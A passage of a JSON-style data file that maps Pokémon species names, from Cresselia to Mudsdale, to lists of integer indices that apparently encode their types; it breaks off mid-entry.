"cresselia": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "phione": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "manaphy": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "darkrai": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "shaymin": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "arceus": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "victini": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 6, 7, 8, 9, 59, 62, 67], "snivy": [15, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 14, 16, 17, 69, 70, 71], "servine": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "serperior": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "tepig": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "pignite": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 40, 41, 88, 89, 90], "emboar": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 40, 41, 88, 89, 90], "oshawott": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "dewott": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "samurott": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "patrat": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "watchog": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "lillipup": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "herdier": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "stoutland": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "purrloin": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "liepard": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "pansage": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "simisage": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "pansear": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "panpour": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "munna": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "musharna": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "pidove": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "unfezant": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "roggenrola": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "boldore": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "gigalith": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "woobat": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 26, 27, 61, 79, 80], "swoobat": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 26, 27, 61, 79, 80], "drilbur": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "excadrill": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 48, 49, 58, 99, 100], "audino": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "timburr": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "gurdurr": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "conkeldurr": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "tympole": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "palpitoad": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "seismitoad": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 25, 32, 53, 55, 77, 78], "sawk": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "sewaddle": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 14, 15, 16, 17, 69, 70, 71], "swadloon": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 14, 15, 16, 17, 69, 70, 71], "leavanny": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 14, 15, 16, 17, 69, 70, 71], "venipede": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "whirlipede": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "scolipede": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 24, 30, 31, 56, 76], "cottonee": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 46, 47, 96, 97, 98], "whimsicott": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 46, 47, 96, 97, 98], "petilil": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "lilligant": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "basculin": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "sandile": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 50, 51, 52, 101, 102], "krokorok": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 50, 51, 52, 101, 102], "krookodile": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 50, 51, 52, 101, 102], "darumaka": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "darmanitan": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "maractus": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "dwebble": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 36, 37, 83, 84, 85], "scraggy": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 40, 41, 88, 89, 90], "scrafty": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 40, 41, 88, 89, 90], "sigilyph": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 26, 27, 61, 79, 80], "yamask": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "cofagrigus": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92], "archen": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 26, 27, 61, 79, 80], "archeops": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 26, 27, 61, 79, 80], "trubbish": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "garbodor": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76], "zorua": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "zoroark": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102], "minccino": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "cinccino": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "gothita": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "gothorita": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "gothitelle": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "solosis": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "duosion": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "reuniclus": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "ducklett": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "swanna": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 26, 27, 61, 79, 80], "vanillite": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "vanillish": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "vanilluxe": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "deerling": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 14, 15, 16, 17, 69, 70, 71], "sawsbuck": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 14, 15, 16, 17, 69, 70, 71], "emolga": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 26, 27, 61, 79, 80], "karrablast": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "escavalier": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 48, 49, 58, 99, 100], "foongus": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 24, 30, 31, 56, 76], "alomomola": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "joltik": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 18, 19, 20, 72, 73], "galvantula": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 18, 19, 20, 72, 73], "ferroseed": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 48, 49, 58, 99, 100], "ferrothorn": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 48, 49, 58, 99, 100], "klink": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "klang": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "klinklang": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100], "tynamo": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "eelektrik": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "eelektross": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "elgyem": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "beheeyem": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "litwick": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 6, 7, 8, 9, 59, 62, 67], "lampent": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 6, 7, 8, 9, 59, 62, 67], "chandelure": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 6, 7, 8, 9, 59, 62, 67], "axew": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "fraxure": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "haxorus": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "cubchoo": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "beartic": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "cryogonal": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "accelgor": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "mienfoo": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "mienshao": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "druddigon": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "golett": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 42, 43, 64, 91, 92], "golurk": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 42, 43, 64, 91, 92], "pawniard": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 48, 49, 58, 99, 100], "bisharp": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 48, 49, 58, 99, 100], "rufflet": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "braviary": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "vullaby": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 26, 27, 61, 79, 80], "mandibuzz": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 26, 27, 61, 79, 80], "heatmor": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "durant": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 48, 49, 58, 99, 100], "deino": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 44, 45, 93, 94, 95], "zweilous": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 44, 45, 93, 94, 95], "hydreigon": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 44, 45, 93, 94, 95], "larvesta": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 6, 7, 8, 9, 59, 62, 67], "volcarona": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 6, 7, 8, 9, 59, 62, 67], "cobalion": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 40, 41, 88, 89, 90], "terrakion": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 40, 41, 88, 89, 90], "virizion": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 40, 41, 88, 89, 90], "tornadus": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80], "thundurus": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 26, 27, 61, 79, 80], "reshiram": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 6, 7, 8, 9, 59, 62, 67], "zekrom": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 18, 19, 20, 72, 73], "landorus": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78, 26, 27, 61, 79, 80], "kyurem": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 38, 39, 57, 86, 87], "keldeo": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 40, 41, 88, 89, 90], "meloetta": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 21, 22, 23, 54, 74, 75], "genesect": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 48, 49, 58, 99, 100], "chespin": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "quilladin": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "chesnaught": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 40, 41, 88, 89, 90], "fennekin": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "braixen": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "delphox": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 21, 22, 23, 54, 74, 75], "froakie": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "frogadier": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "greninja": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 50, 51, 52, 101, 102], "bunnelby": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "diggersby": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 25, 32, 53, 55, 77, 78], "fletchling": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "fletchinder": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 26, 27, 61, 79, 80], "talonflame": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 26, 27, 61, 79, 80], "scatterbug": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "spewpa": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "vivillon": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 26, 27, 61, 79, 80], "litleo": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "flabébé": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "floette": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "florges": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "skiddo": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "gogoat": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71], "pancham": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "pangoro": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 50, 51, 52, 101, 102], "furfrou": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "espurr": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "meowstic": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75], "honedge": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 42, 43, 64, 91, 92], "doublade": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 42, 43, 64, 91, 92], "aegislash": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 42, 43, 64, 91, 92], "spritzee": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "swirlix": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "slurpuff": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "inkay": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 21, 22, 23, 54, 74, 75], "malamar": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 21, 22, 23, 54, 74, 75], "binacle": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 10, 11, 12, 13, 63, 68], "barbaracle": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 10, 11, 12, 13, 63, 68], "skrelp": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 10, 11, 12, 13, 63, 68], "dragalge": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 44, 45, 93, 94, 95], "clauncher": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "clawitzer": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "helioptile": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "heliolisk": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73], "tyrunt": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 44, 45, 93, 94, 95], "tyrantrum": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 44, 45, 93, 94, 95], "amaura": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 38, 39, 57, 86, 87], "aurorus": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 38, 39, 57, 86, 87], "sylveon": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "hawlucha": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 26, 27, 61, 79, 80], "dedenne": [18, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 19, 20, 72, 73, 46, 47, 96, 97, 98], "carbink": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 46, 47, 96, 97, 98], "goomy": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "sliggoo": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "goodra": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95], "klefki": [48, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 49, 58, 99, 100, 46, 47, 96, 97, 98], "phantump": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 14, 15, 16, 17, 69, 70, 71], "trevenant": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 14, 15, 16, 17, 69, 70, 71], "pumpkaboo": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 14, 15, 16, 17, 69, 70, 71], "gourgeist": [43, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 42, 64, 91, 92, 14, 15, 16, 17, 69, 70, 71], "bergmite": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "avalugg": [38, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 39, 57, 86, 87], "noibat": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80, 44, 45, 93, 94, 95], "noivern": [26, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 27, 61, 79, 80, 44, 45, 93, 94, 95], "xerneas": [46, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 47, 96, 97, 98], "yveltal": [50, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 51, 52, 101, 102, 26, 27, 61, 79, 80], "zygarde": [44, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 45, 93, 94, 95, 25, 32, 53, 55, 77, 78], "diancie": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85, 46, 47, 96, 97, 98], "hoopa": [21, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 22, 23, 54, 74, 75, 42, 43, 64, 91, 92], "volcanion": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 10, 11, 12, 13, 63, 68], "rowlet": [15, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 14, 16, 17, 69, 70, 71, 26, 27, 61, 79, 80], "dartrix": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 26, 27, 61, 79, 80], "decidueye": [14, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 15, 16, 17, 69, 70, 71, 42, 43, 64, 91, 92], "litten": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "torracat": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67], "incineroar": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 50, 51, 52, 101, 102], "popplio": [11, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 10, 12, 13, 63, 68], "brionne": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "primarina": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68, 46, 47, 96, 97, 98], "pikipek": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 26, 27, 61, 79, 80], "yungoos": [0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66], "grubbin": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82], "charjabug": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 18, 19, 20, 72, 73], "vikavolt": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 18, 19, 20, 72, 73], "crabrawler": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90], "crabominable": [40, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 41, 88, 89, 90, 38, 39, 57, 86, 87], "oricorio": [6, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 7, 8, 9, 59, 62, 67, 26, 27, 61, 79, 80], "cutiefly": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 46, 47, 96, 97, 98], "ribombee": [33, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 34, 35, 81, 82, 46, 47, 96, 97, 98], "rockruff": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "lycanroc": [36, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 37, 83, 84, 85], "wishiwashi": [10, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 11, 12, 13, 63, 68], "mareanie": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 10, 11, 12, 13, 63, 68], "toxapex": [24, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 30, 31, 56, 76, 10, 11, 12, 13, 63, 68], "mudbray": [25, 0, 1, 2, 3, 4, 5, 28, 29, 60, 65, 66, 32, 53, 55, 77, 78], "mudsdale": [25, 0, 1, 2, 3, 